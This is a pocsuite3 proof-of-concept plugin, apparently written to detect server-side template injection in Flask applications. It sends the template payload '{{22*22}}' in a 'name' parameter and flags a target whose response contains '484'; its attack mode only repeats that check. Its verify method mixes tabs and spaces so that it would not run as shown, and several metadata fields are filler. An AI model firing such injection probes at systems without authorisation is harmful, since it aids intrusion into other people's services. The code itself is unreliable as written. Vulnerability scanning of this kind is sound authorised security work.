from pocsuite3.api import Output,POCBase,register_poc,requests

class FlaskInjection(POCBase):
    vulID = '1003'
    version = '1.1'
    author = ['一寸一叶']
    vulDate = '1.1'
    createDate = '2020/11/21'
    updateDate = '2020/11/21'
    references = ['flask']
    name = 'flask-poc'
    appPowerLink = 'flask'
    appName = 'flask'
    appVersion = 'flask'
    desc = '''
        flask注入
    '''
    samples = []

    def _verify(self):
    	result = {}
	    path = '/?name='
	    payload = '{{22*22}}'
	    target = self.url+path+payload
	    res = requests.get(target)
	    if res.status_code == 200 and '484' in res.text:
	        result['VerifyInfo'] = {}
	        result['VerifyInfo']['URL'] = self.url
	        result['VerifyInfo']['Postdata'] = payload	
	    return self.parse_output(result)
    def _attack(self):
    	return self._verify()
    def parse_output(self,result):
    	output = Output(self)
    	if result:
    		output.success(result)
    	else:
    		output.fail('target is not vulnerable')
    	return result
register_poc(FlaskInjection)